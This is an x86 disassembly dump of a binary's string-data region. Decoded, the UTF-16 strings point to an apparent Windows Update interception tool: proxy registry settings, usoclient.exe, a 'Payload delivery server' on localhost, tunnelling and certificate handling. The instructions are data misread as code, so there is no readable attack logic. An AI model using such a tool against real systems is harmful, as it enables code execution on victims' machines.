  40b72c:	00 72 00             	add    %dh,0x0(%edx)
  40b72f:	74 00                	je     0x40b731
  40b731:	20 00                	and    %al,(%eax)
  40b733:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  40b739:	69 00 6e 00 76 00    	imul   $0x76006e,(%eax),%eax
  40b73f:	61                   	popa
  40b740:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b744:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b748:	00 00                	add    %al,(%eax)
  40b74a:	80 9b 48 00 4b 00 45 	sbbb   $0x45,0x4b0048(%ebx)
  40b751:	00 59 00             	add    %bl,0x0(%ecx)
  40b754:	5f                   	pop    %edi
  40b755:	00 43 00             	add    %al,0x0(%ebx)
  40b758:	55                   	push   %ebp
  40b759:	00 52 00             	add    %dl,0x0(%edx)
  40b75c:	52                   	push   %edx
  40b75d:	00 45 00             	add    %al,0x0(%ebp)
  40b760:	4e                   	dec    %esi
  40b761:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40b765:	00 55 00             	add    %dl,0x0(%ebp)
  40b768:	53                   	push   %ebx
  40b769:	00 45 00             	add    %al,0x0(%ebp)
  40b76c:	52                   	push   %edx
  40b76d:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
  40b771:	00 6f 00             	add    %ch,0x0(%edi)
  40b774:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40b779:	00 61 00             	add    %ah,0x0(%ecx)
  40b77c:	72 00                	jb     0x40b77e
  40b77e:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40b783:	00 69 00             	add    %ch,0x0(%ecx)
  40b786:	63 00                	arpl   %eax,(%eax)
  40b788:	72 00                	jb     0x40b78a
  40b78a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b78b:	00 73 00             	add    %dh,0x0(%ebx)
  40b78e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b78f:	00 66 00             	add    %ah,0x0(%esi)
  40b792:	74 00                	je     0x40b794
  40b794:	5c                   	pop    %esp
  40b795:	00 57 00             	add    %dl,0x0(%edi)
  40b798:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b79e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b79f:	00 77 00             	add    %dh,0x0(%edi)
  40b7a2:	73 00                	jae    0x40b7a4
  40b7a4:	5c                   	pop    %esp
  40b7a5:	00 43 00             	add    %al,0x0(%ebx)
  40b7a8:	75 00                	jne    0x40b7aa
  40b7aa:	72 00                	jb     0x40b7ac
  40b7ac:	72 00                	jb     0x40b7ae
  40b7ae:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b7b2:	74 00                	je     0x40b7b4
  40b7b4:	56                   	push   %esi
  40b7b5:	00 65 00             	add    %ah,0x0(%ebp)
  40b7b8:	72 00                	jb     0x40b7ba
  40b7ba:	73 00                	jae    0x40b7bc
  40b7bc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b7c2:	5c                   	pop    %esp
  40b7c3:	00 49 00             	add    %cl,0x0(%ecx)
  40b7c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7c7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b7cb:	00 72 00             	add    %dh,0x0(%edx)
  40b7ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7cf:	00 65 00             	add    %ah,0x0(%ebp)
  40b7d2:	74 00                	je     0x40b7d4
  40b7d4:	20 00                	and    %al,(%eax)
  40b7d6:	53                   	push   %ebx
  40b7d7:	00 65 00             	add    %ah,0x0(%ebp)
  40b7da:	74 00                	je     0x40b7dc
  40b7dc:	74 00                	je     0x40b7de
  40b7de:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b7e4:	73 00                	jae    0x40b7e6
  40b7e6:	00 17                	add    %dl,(%edi)
  40b7e8:	50                   	push   %eax
  40b7e9:	00 72 00             	add    %dh,0x0(%edx)
  40b7ec:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7ed:	00 78 00             	add    %bh,0x0(%eax)
  40b7f0:	79 00                	jns    0x40b7f2
  40b7f2:	45                   	inc    %ebp
  40b7f3:	00 6e 00             	add    %ch,0x0(%esi)
  40b7f6:	61                   	popa
  40b7f7:	00 62 00             	add    %ah,0x0(%edx)
  40b7fa:	6c                   	insb   (%dx),%es:(%edi)
  40b7fb:	00 65 00             	add    %ah,0x0(%ebp)
  40b7fe:	00 17                	add    %dl,(%edi)
  40b800:	50                   	push   %eax
  40b801:	00 72 00             	add    %dh,0x0(%edx)
  40b804:	6f                   	outsl  %ds:(%esi),(%dx)
  40b805:	00 78 00             	add    %bh,0x0(%eax)
  40b808:	79 00                	jns    0x40b80a
  40b80a:	53                   	push   %ebx
  40b80b:	00 65 00             	add    %ah,0x0(%ebp)
  40b80e:	72 00                	jb     0x40b810
  40b810:	76 00                	jbe    0x40b812
  40b812:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b816:	00 01                	add    %al,(%ecx)
  40b818:	00 2d 5e 00 5b 00    	add    %ch,0x5b005e
  40b81e:	5e                   	pop    %esi
  40b81f:	00 3a                	add    %bh,(%edx)
  40b821:	00 7c 00 3d          	add    %bh,0x3d(%eax,%eax,1)
  40b825:	00 5d 00             	add    %bl,0x0(%ebp)
  40b828:	7b 00                	jnp    0x40b82a
  40b82a:	31 00                	xor    %eax,(%eax)
  40b82c:	2c 00                	sub    $0x0,%al
  40b82e:	7d 00                	jge    0x40b830
  40b830:	3a 00                	cmp    (%eax),%al
  40b832:	5b                   	pop    %ebx
  40b833:	00 30                	add    %dh,(%eax)
  40b835:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  40b83b:	00 7b 00             	add    %bh,0x0(%ebx)
  40b83e:	31 00                	xor    %eax,(%eax)
  40b840:	2c 00                	sub    $0x0,%al
  40b842:	7d 00                	jge    0x40b844
  40b844:	24 00                	and    $0x0,%al
  40b846:	01 59 68             	add    %ebx,0x68(%ecx)
  40b849:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b84d:	00 70 00             	add    %dh,0x0(%eax)
  40b850:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b855:	00 7d 00             	add    %bh,0x0(%ebp)
  40b858:	3a 00                	cmp    (%eax),%al
  40b85a:	7b 00                	jnp    0x40b85c
  40b85c:	31 00                	xor    %eax,(%eax)
  40b85e:	7d 00                	jge    0x40b860
  40b860:	3b 00                	cmp    (%eax),%eax
  40b862:	68 00 74 00 74       	push   $0x74007400
  40b867:	00 70 00             	add    %dh,0x0(%eax)
  40b86a:	73 00                	jae    0x40b86c
  40b86c:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b871:	00 7d 00             	add    %bh,0x0(%ebp)
  40b874:	3a 00                	cmp    (%eax),%al
  40b876:	7b 00                	jnp    0x40b878
  40b878:	31 00                	xor    %eax,(%eax)
  40b87a:	7d 00                	jge    0x40b87c
  40b87c:	3b 00                	cmp    (%eax),%eax
  40b87e:	66 00 74 00 70       	data16 add %dh,0x70(%eax,%eax,1)
  40b883:	00 3d 00 7b 00 32    	add    %bh,0x32007b00
  40b889:	00 7d 00             	add    %bh,0x0(%ebp)
  40b88c:	3b 00                	cmp    (%eax),%eax
  40b88e:	73 00                	jae    0x40b890
  40b890:	6f                   	outsl  %ds:(%esi),(%dx)
  40b891:	00 63 00             	add    %ah,0x0(%ebx)
  40b894:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b897:	00 3d 00 7b 00 33    	add    %bh,0x33007b00
  40b89d:	00 7d 00             	add    %bh,0x0(%ebp)
  40b8a0:	00 51 68             	add    %dl,0x68(%ecx)
  40b8a3:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b8a7:	00 70 00             	add    %dh,0x0(%eax)
  40b8aa:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b8af:	00 7d 00             	add    %bh,0x0(%ebp)
  40b8b2:	3a 00                	cmp    (%eax),%al
  40b8b4:	7b 00                	jnp    0x40b8b6
  40b8b6:	31 00                	xor    %eax,(%eax)
  40b8b8:	7d 00                	jge    0x40b8ba
  40b8ba:	3b 00                	cmp    (%eax),%eax
  40b8bc:	68 00 74 00 74       	push   $0x74007400
  40b8c1:	00 70 00             	add    %dh,0x0(%eax)
  40b8c4:	73 00                	jae    0x40b8c6
  40b8c6:	3d 00 7b 00 32       	cmp    $0x32007b00,%eax
  40b8cb:	00 7d 00             	add    %bh,0x0(%ebp)
  40b8ce:	3b 00                	cmp    (%eax),%eax
  40b8d0:	66 00 74 00 70       	data16 add %dh,0x70(%eax,%eax,1)
  40b8d5:	00 3d 00 7b 00 33    	add    %bh,0x33007b00
  40b8db:	00 7d 00             	add    %bh,0x0(%ebp)
  40b8de:	3b 00                	cmp    (%eax),%eax
  40b8e0:	73 00                	jae    0x40b8e2
  40b8e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e3:	00 63 00             	add    %ah,0x0(%ebx)
  40b8e6:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b8e9:	00 3d 00 7b 00 34    	add    %bh,0x34007b00
  40b8ef:	00 7d 00             	add    %bh,0x0(%ebp)
  40b8f2:	00 35 68 00 74 00    	add    %dh,0x740068
  40b8f8:	74 00                	je     0x40b8fa
  40b8fa:	70 00                	jo     0x40b8fc
  40b8fc:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b901:	00 7d 00             	add    %bh,0x0(%ebp)
  40b904:	3a 00                	cmp    (%eax),%al
  40b906:	7b 00                	jnp    0x40b908
  40b908:	31 00                	xor    %eax,(%eax)
  40b90a:	7d 00                	jge    0x40b90c
  40b90c:	3b 00                	cmp    (%eax),%eax
  40b90e:	68 00 74 00 74       	push   $0x74007400
  40b913:	00 70 00             	add    %dh,0x0(%eax)
  40b916:	73 00                	jae    0x40b918
  40b918:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b91d:	00 7d 00             	add    %bh,0x0(%ebp)
  40b920:	3a 00                	cmp    (%eax),%al
  40b922:	7b 00                	jnp    0x40b924
  40b924:	31 00                	xor    %eax,(%eax)
  40b926:	7d 00                	jge    0x40b928
  40b928:	00 19                	add    %bl,(%ecx)
  40b92a:	68 00 74 00 74       	push   $0x74007400
  40b92f:	00 70 00             	add    %dh,0x0(%eax)
  40b932:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b937:	00 7d 00             	add    %bh,0x0(%ebp)
  40b93a:	3a 00                	cmp    (%eax),%al
  40b93c:	7b 00                	jnp    0x40b93e
  40b93e:	31 00                	xor    %eax,(%eax)
  40b940:	7d 00                	jge    0x40b942
  40b942:	00 2f                	add    %ch,(%edi)
  40b944:	68 00 74 00 74       	push   $0x74007400
  40b949:	00 70 00             	add    %dh,0x0(%eax)
  40b94c:	3d 00 5b 00 5e       	cmp    $0x5e005b00,%eax
  40b951:	00 3a                	add    %bh,(%edx)
  40b953:	00 5d 00             	add    %bl,0x0(%ebp)
  40b956:	7b 00                	jnp    0x40b958
  40b958:	31 00                	xor    %eax,(%eax)
  40b95a:	2c 00                	sub    $0x0,%al
  40b95c:	7d 00                	jge    0x40b95e
  40b95e:	3a 00                	cmp    (%eax),%al
  40b960:	5b                   	pop    %ebx
  40b961:	00 30                	add    %dh,(%eax)
  40b963:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  40b969:	00 7b 00             	add    %bh,0x0(%ebx)
  40b96c:	31 00                	xor    %eax,(%eax)
  40b96e:	2c 00                	sub    $0x0,%al
  40b970:	7d 00                	jge    0x40b972
  40b972:	01 31                	add    %esi,(%ecx)
  40b974:	68 00 74 00 74       	push   $0x74007400
  40b979:	00 70 00             	add    %dh,0x0(%eax)
  40b97c:	73 00                	jae    0x40b97e
  40b97e:	3d 00 5b 00 5e       	cmp    $0x5e005b00,%eax
  40b983:	00 3a                	add    %bh,(%edx)
  40b985:	00 5d 00             	add    %bl,0x0(%ebp)
  40b988:	7b 00                	jnp    0x40b98a
  40b98a:	31 00                	xor    %eax,(%eax)
  40b98c:	2c 00                	sub    $0x0,%al
  40b98e:	7d 00                	jge    0x40b990
  40b990:	3a 00                	cmp    (%eax),%al
  40b992:	5b                   	pop    %ebx
  40b993:	00 30                	add    %dh,(%eax)
  40b995:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  40b99b:	00 7b 00             	add    %bh,0x0(%ebx)
  40b99e:	31 00                	xor    %eax,(%eax)
  40b9a0:	2c 00                	sub    $0x0,%al
  40b9a2:	7d 00                	jge    0x40b9a4
  40b9a4:	01 1b                	add    %ebx,(%ebx)
  40b9a6:	68 00 74 00 74       	push   $0x74007400
  40b9ab:	00 70 00             	add    %dh,0x0(%eax)
  40b9ae:	73 00                	jae    0x40b9b0
  40b9b0:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  40b9b5:	00 7d 00             	add    %bh,0x0(%ebp)
  40b9b8:	3a 00                	cmp    (%eax),%al
  40b9ba:	7b 00                	jnp    0x40b9bc
  40b9bc:	31 00                	xor    %eax,(%eax)
  40b9be:	7d 00                	jge    0x40b9c0
  40b9c0:	00 29                	add    %ch,(%ecx)
  40b9c2:	53                   	push   %ebx
  40b9c3:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b9c7:	00 72 00             	add    %dh,0x0(%edx)
  40b9ca:	74 00                	je     0x40b9cc
  40b9cc:	49                   	dec    %ecx
  40b9cd:	00 6e 00             	add    %ch,0x0(%esi)
  40b9d0:	74 00                	je     0x40b9d2
  40b9d2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9d6:	61                   	popa
  40b9d7:	00 63 00             	add    %ah,0x0(%ebx)
  40b9da:	74 00                	je     0x40b9dc
  40b9dc:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40b9e2:	53                   	push   %ebx
  40b9e3:	00 63 00             	add    %ah,0x0(%ebx)
  40b9e6:	61                   	popa
  40b9e7:	00 6e 00             	add    %ch,0x0(%esi)
  40b9ea:	00 09                	add    %cl,(%ecx)
  40b9ec:	50                   	push   %eax
  40b9ed:	00 41 00             	add    %al,0x0(%ecx)
  40b9f0:	54                   	push   %esp
  40b9f1:	00 48 00             	add    %cl,0x0(%eax)
  40b9f4:	00 1b                	add    %bl,(%ebx)
  40b9f6:	75 00                	jne    0x40b9f8
  40b9f8:	73 00                	jae    0x40b9fa
  40b9fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9fb:	00 63 00             	add    %ah,0x0(%ebx)
  40b9fe:	6c                   	insb   (%dx),%es:(%edi)
  40b9ff:	00 69 00             	add    %ch,0x0(%ecx)
  40ba02:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ba06:	74 00                	je     0x40ba08
  40ba08:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40ba0c:	78 00                	js     0x40ba0e
  40ba0e:	65 00 00             	add    %al,%gs:(%eax)
  40ba11:	2b 68 00             	sub    0x0(%eax),%ebp
  40ba14:	74 00                	je     0x40ba16
  40ba16:	74 00                	je     0x40ba18
  40ba18:	70 00                	jo     0x40ba1a
  40ba1a:	3a 00                	cmp    (%eax),%al
  40ba1c:	2f                   	das
  40ba1d:	00 2f                	add    %ch,(%edi)
  40ba1f:	00 31                	add    %dh,(%ecx)
  40ba21:	00 32                	add    %dh,(%edx)
  40ba23:	00 37                	add    %dh,(%edi)
  40ba25:	00 2e                	add    %ch,(%esi)
  40ba27:	00 30                	add    %dh,(%eax)
  40ba29:	00 2e                	add    %ch,(%esi)
  40ba2b:	00 30                	add    %dh,(%eax)
  40ba2d:	00 2e                	add    %ch,(%esi)
  40ba2f:	00 31                	add    %dh,(%ecx)
  40ba31:	00 3a                	add    %bh,(%edx)
  40ba33:	00 7b 00             	add    %bh,0x0(%ebx)
  40ba36:	30 00                	xor    %al,(%eax)
  40ba38:	7d 00                	jge    0x40ba3a
  40ba3a:	2f                   	das
  40ba3b:	00 00                	add    %al,(%eax)
  40ba3d:	73 53                	jae    0x40ba92
  40ba3f:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40ba43:	00 72 00             	add    %dh,0x0(%edx)
  40ba46:	74 00                	je     0x40ba48
  40ba48:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40ba4e:	20 00                	and    %al,(%eax)
  40ba50:	50                   	push   %eax
  40ba51:	00 61 00             	add    %ah,0x0(%ecx)
  40ba54:	79 00                	jns    0x40ba56
  40ba56:	6c                   	insb   (%dx),%es:(%edi)
  40ba57:	00 6f 00             	add    %ch,0x0(%edi)
  40ba5a:	61                   	popa
  40ba5b:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40ba5f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40ba63:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40ba67:	00 76 00             	add    %dh,0x0(%esi)
  40ba6a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba6e:	79 00                	jns    0x40ba70
  40ba70:	20 00                	and    %al,(%eax)
  40ba72:	73 00                	jae    0x40ba74
  40ba74:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba78:	76 00                	jbe    0x40ba7a
  40ba7a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba7e:	20 00                	and    %al,(%eax)
  40ba80:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba81:	00 6e 00             	add    %ch,0x0(%esi)
  40ba84:	20 00                	and    %al,(%eax)
  40ba86:	68 00 74 00 74       	push   $0x74007400
  40ba8b:	00 70 00             	add    %dh,0x0(%eax)
  40ba8e:	3a 00                	cmp    (%eax),%al
  40ba90:	2f                   	das
  40ba91:	00 2f                	add    %ch,(%edi)
  40ba93:	00 31                	add    %dh,(%ecx)
  40ba95:	00 32                	add    %dh,(%edx)
  40ba97:	00 37                	add    %dh,(%edi)
  40ba99:	00 2e                	add    %ch,(%esi)
  40ba9b:	00 30                	add    %dh,(%eax)
  40ba9d:	00 2e                	add    %ch,(%esi)
  40ba9f:	00 30                	add    %dh,(%eax)
  40baa1:	00 2e                	add    %ch,(%esi)
  40baa3:	00 31                	add    %dh,(%ecx)
  40baa5:	00 3a                	add    %bh,(%edx)
  40baa7:	00 7b 00             	add    %bh,0x0(%ebx)
  40baaa:	30 00                	xor    %al,(%eax)
  40baac:	7d 00                	jge    0x40baae
  40baae:	2f                   	das
  40baaf:	00 00                	add    %al,(%eax)
  40bab1:	69 4c 00 69 00 73 00 	imul   $0x74007300,0x69(%eax,%eax,1),%ecx
  40bab8:	74 
  40bab9:	00 65 00             	add    %ah,0x0(%ebp)
  40babc:	6e                   	outsb  %ds:(%esi),(%dx)
  40babd:	00 69 00             	add    %ch,0x0(%ecx)
  40bac0:	6e                   	outsb  %ds:(%esi),(%dx)
  40bac1:	00 67 00             	add    %ah,0x0(%edi)
  40bac4:	20 00                	and    %al,(%eax)
  40bac6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac7:	00 6e 00             	add    %ch,0x0(%esi)
  40baca:	20 00                	and    %al,(%eax)
  40bacc:	27                   	daa
  40bacd:	00 7b 00             	add    %bh,0x0(%ebx)
  40bad0:	30 00                	xor    %al,(%eax)
  40bad2:	7d 00                	jge    0x40bad4
  40bad4:	27                   	daa
  40bad5:	00 20                	add    %ah,(%eax)
  40bad7:	00 65 00             	add    %ah,0x0(%ebp)
  40bada:	6e                   	outsb  %ds:(%esi),(%dx)
  40badb:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40badf:	00 6f 00             	add    %ch,0x0(%edi)
  40bae2:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  40bae8:	20 00                	and    %al,(%eax)
  40baea:	61                   	popa
  40baeb:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40baef:	00 49 00             	add    %cl,0x0(%ecx)
  40baf2:	70 00                	jo     0x40baf4
  40baf4:	20 00                	and    %al,(%eax)
  40baf6:	7b 00                	jnp    0x40baf8
  40baf8:	31 00                	xor    %eax,(%eax)
  40bafa:	7d 00                	jge    0x40bafc
  40bafc:	20 00                	and    %al,(%eax)
  40bafe:	61                   	popa
  40baff:	00 6e 00             	add    %ch,0x0(%esi)
  40bb02:	64 00 20             	add    %ah,%fs:(%eax)
  40bb05:	00 70 00             	add    %dh,0x0(%eax)
  40bb08:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb09:	00 72 00             	add    %dh,0x0(%edx)
  40bb0c:	74 00                	je     0x40bb0e
  40bb0e:	3a 00                	cmp    (%eax),%al
  40bb10:	20 00                	and    %al,(%eax)
  40bb12:	7b 00                	jnp    0x40bb14
  40bb14:	32 00                	xor    (%eax),%al
  40bb16:	7d 00                	jge    0x40bb18
  40bb18:	20 00                	and    %al,(%eax)
  40bb1a:	01 13                	add    %edx,(%ebx)
  40bb1c:	31 00                	xor    %eax,(%eax)
  40bb1e:	32 00                	xor    (%eax),%al
  40bb20:	37                   	aaa
  40bb21:	00 2e                	add    %ch,(%esi)
  40bb23:	00 30                	add    %dh,(%eax)
  40bb25:	00 2e                	add    %ch,(%esi)
  40bb27:	00 30                	add    %dh,(%eax)
  40bb29:	00 2e                	add    %ch,(%esi)
  40bb2b:	00 31                	add    %dh,(%ecx)
  40bb2d:	00 00                	add    %al,(%eax)
  40bb2f:	07                   	pop    %es
  40bb30:	43                   	inc    %ebx
  40bb31:	00 4e 00             	add    %cl,0x0(%esi)
  40bb34:	3d 00 00 1b 53       	cmp    $0x531b0000,%eax
  40bb39:	00 48 00             	add    %cl,0x0(%eax)
  40bb3c:	41                   	inc    %ecx
  40bb3d:	00 32                	add    %dh,(%edx)
  40bb3f:	00 35 00 36 00 57    	add    %dh,0x57003600
  40bb45:	00 69 00             	add    %ch,0x0(%ecx)
  40bb48:	74 00                	je     0x40bb4a
  40bb4a:	68 00 52 00 53       	push   $0x53005200
  40bb4f:	00 41 00             	add    %al,0x0(%ecx)
  40bb52:	00 4b 4d             	add    %cl,0x4d(%ebx)
  40bb55:	00 61 00             	add    %ah,0x0(%ecx)
  40bb58:	6c                   	insb   (%dx),%es:(%edi)
  40bb59:	00 66 00             	add    %ah,0x0(%esi)
  40bb5c:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb5d:	00 72 00             	add    %dh,0x0(%edx)
  40bb60:	6d                   	insl   (%dx),%es:(%edi)
  40bb61:	00 65 00             	add    %ah,0x0(%ebp)
  40bb64:	64 00 20             	add    %ah,%fs:(%eax)
  40bb67:	00 73 00             	add    %dh,0x0(%ebx)
  40bb6a:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40bb6e:	75 00                	jne    0x40bb70
  40bb70:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40bb74:	63 00                	arpl   %eax,(%eax)
  40bb76:	65 00 20             	add    %ah,%gs:(%eax)
  40bb79:	00 69 00             	add    %ch,0x0(%ecx)
  40bb7c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb7d:	00 20                	add    %ah,(%eax)
  40bb7f:	00 52 00             	add    %dl,0x0(%edx)
  40bb82:	53                   	push   %ebx
  40bb83:	00 41 00             	add    %al,0x0(%ecx)
  40bb86:	20 00                	and    %al,(%eax)
  40bb88:	70 00                	jo     0x40bb8a
  40bb8a:	72 00                	jb     0x40bb8c
  40bb8c:	69 00 76 00 61 00    	imul   $0x610076,(%eax),%eax
  40bb92:	74 00                	je     0x40bb94
  40bb94:	65 00 20             	add    %ah,%gs:(%eax)
  40bb97:	00 6b 00             	add    %ch,0x0(%ebx)
  40bb9a:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40bb9e:	00 11                	add    %dl,(%ecx)
  40bba0:	70 00                	jo     0x40bba2
  40bba2:	61                   	popa
  40bba3:	00 73 00             	add    %dh,0x0(%ebx)
  40bba6:	73 00                	jae    0x40bba8
  40bba8:	77 00                	ja     0x40bbaa
  40bbaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbab:	00 72 00             	add    %dh,0x0(%edx)
  40bbae:	64 00 00             	add    %al,%fs:(%eax)
  40bbb1:	31 61 00             	xor    %esp,0x0(%ecx)
  40bbb4:	70 00                	jo     0x40bbb6
  40bbb6:	70 00                	jo     0x40bbb8
  40bbb8:	6c                   	insb   (%dx),%es:(%edi)
  40bbb9:	00 69 00             	add    %ch,0x0(%ecx)
  40bbbc:	63 00                	arpl   %eax,(%eax)
  40bbbe:	61                   	popa
  40bbbf:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bbc3:	00 6f 00             	add    %ch,0x0(%edi)
  40bbc6:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbc7:	00 2f                	add    %ch,(%edi)
  40bbc9:	00 6f 00             	add    %ch,0x0(%edi)
  40bbcc:	63 00                	arpl   %eax,(%eax)
  40bbce:	74 00                	je     0x40bbd0
  40bbd0:	65 00 74 00 2d       	add    %dh,%gs:0x2d(%eax,%eax,1)
  40bbd5:	00 73 00             	add    %dh,0x0(%ebx)
  40bbd8:	74 00                	je     0x40bbda
  40bbda:	72 00                	jb     0x40bbdc
  40bbdc:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bbe0:	6d                   	insl   (%dx),%es:(%edi)
  40bbe1:	00 01                	add    %al,(%ecx)
  40bbe3:	05 3a 00 20 00       	add    $0x20003a,%eax
  40bbe8:	00 23                	add    %ah,(%ebx)
  40bbea:	53                   	push   %ebx
  40bbeb:	00 79 00             	add    %bh,0x0(%ecx)
  40bbee:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbef:	00 63 00             	add    %ah,0x0(%ebx)
  40bbf2:	55                   	push   %ebp
  40bbf3:	00 70 00             	add    %dh,0x0(%eax)
  40bbf6:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bbfa:	74 00                	je     0x40bbfc
  40bbfc:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bc00:	52                   	push   %edx
  40bc01:	00 65 00             	add    %ah,0x0(%ebp)
  40bc04:	73 00                	jae    0x40bc06
  40bc06:	75 00                	jne    0x40bc08
  40bc08:	6c                   	insb   (%dx),%es:(%edi)
  40bc09:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bc0d:	17                   	pop    %ss
  40bc0e:	54                   	push   %esp
  40bc0f:	00 75 00             	add    %dh,0x0(%ebp)
  40bc12:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc13:	00 6e 00             	add    %ch,0x0(%esi)
  40bc16:	65 00 6c 00 20       	add    %ch,%gs:0x20(%eax,%eax,1)
  40bc1b:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40bc1f:	00 3a                	add    %bh,(%edx)
  40bc21:	00 20                	add    %ah,(%eax)
  40bc23:	00 00                	add    %al,(%eax)
  40bc25:	35 41 00 63 00       	xor    $0x630041,%eax
  40bc2a:	74 00                	je     0x40bc2c
  40bc2c:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40bc32:	20 00                	and    %al,(%eax)
  40bc34:	43                   	inc    %ebx
  40bc35:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bc39:	00 65 00             	add    %ah,0x0(%ebp)
  40bc3c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc3d:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40bc41:	00 43 00             	add    %al,0x0(%ebx)
  40bc44:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc45:	00 6e 00             	add    %ch,0x0(%esi)
  40bc48:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc49:	00 65 00             	add    %ah,0x0(%ebp)
  40bc4c:	63 00                	arpl   %eax,(%eax)
  40bc4e:	74 00                	je     0x40bc50
  40bc50:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bc56:	73 00                	jae    0x40bc58
  40bc58:	3a 00                	cmp    (%eax),%al
  40bc5a:	00 0f                	add    %cl,(%edi)
  40bc5c:	7b 00                	jnp    0x40bc5e
  40bc5e:	30 00                	xor    %al,(%eax)
  40bc60:	7d 00                	jge    0x40bc62
  40bc62:	20 00                	and    %al,(%eax)
  40bc64:	7b 00                	jnp    0x40bc66
  40bc66:	31 00                	xor    %eax,(%eax)
  40bc68:	7d 00                	jge    0x40bc6a
  40bc6a:	00 37                	add    %dh,(%edi)
  40bc6c:	3c 00                	cmp    $0x0,%al
  40bc6e:	49                   	dec    %ecx
  40bc6f:	00 6e 00             	add    %ch,0x0(%esi)
  40bc72:	73 00                	jae    0x40bc74
  40bc74:	74 00                	je     0x40bc76
  40bc76:	61                   	popa
  40bc77:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bc7b:	00 65 00             	add    %ah,0x0(%ebp)
  40bc7e:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40bc82:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc83:	00 6e 00             	add    %ch,0x0(%esi)
  40bc86:	4c                   	dec    %esp
  40bc87:	00 65 00             	add    %ah,0x0(%ebp)
  40bc8a:	61                   	popa
  40bc8b:	00 66 00             	add    %ah,0x0(%esi)
  40bc8e:	55                   	push   %ebp
  40bc8f:	00 70 00             	add    %dh,0x0(%eax)
  40bc92:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bc96:	74 00                	je     0x40bc98
  40bc98:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40bc9c:	44                   	inc    %esp
  40bc9d:	00 73 00             	add    %dh,0x0(%ebx)
  40bca0:	3e 00 00             	add    %al,%ds:(%eax)
  40bca3:	1b 3c 00             	sbb    (%eax,%eax,1),%edi
  40bca6:	48                   	dec    %eax
